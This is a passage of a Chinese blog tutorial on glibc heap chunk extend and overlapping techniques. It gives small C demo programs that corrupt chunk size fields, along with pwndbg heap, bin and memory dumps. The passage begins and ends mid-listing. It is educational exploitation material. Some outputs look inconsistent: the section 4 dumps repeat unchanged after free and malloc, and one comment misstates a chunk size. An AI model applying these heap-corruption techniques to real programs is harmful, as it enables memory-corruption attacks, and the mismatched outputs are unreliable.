class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​之后直接 free 掉 chunk1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​这里还是能看出来存在两个 chunk 的，当修改了 size 域大小后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​原本的三个 chunk 变成了两个，并且 chunk2 还是 allocated 状态，重叠之后，chunk1 是 free 状态，所以整个 chunk 依旧是 free 状态。之后 malloc (0xa0) 试试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="4-extend前向overlapping"><a class="markdownIt-Anchor" href="#4-extend前向overlapping">#</a> 4、extend 前向 overlapping：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 4.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​还是老样子，进行 4 次 malloc，看下 heap 和 bin 以及 chunk 的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81&lt;======Top Chunk</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​之后修改 size 域：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​之后 free：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​之后重新 malloc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="5-通过extend前向overlapping"><a class="markdownIt-Anchor" href="#5-通过extend前向overlapping">#</a> 5、通过 extend 前向 overlapping：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 5.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span 